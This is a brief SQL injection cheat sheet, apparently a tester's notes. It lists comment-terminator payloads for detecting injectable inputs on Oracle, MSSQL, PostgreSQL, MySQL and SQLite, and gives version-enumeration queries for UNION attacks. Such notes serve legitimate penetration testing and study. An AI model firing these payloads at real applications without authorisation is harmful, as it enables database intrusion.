# Entry Point
if output by the application is unchanged after one of these payloads - it might be vulnerable to SQLi.

Oracle / MSSQL / PostgreSQL / MySQL / SQLite
```
 -- 
' -- 
" -- 
 /*
' /* 
" /* 
```
MySQL
```
 # 
' # 
" # 
```
# Version enumeration using UNION attack

PostgreSQL / MySQL / MariaDB
```
SELECT version()
```
MSSQL / MySQL
```
SELECT @@version
```
SQLite
```
SELECT sqlite_version()
```
Oracle
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```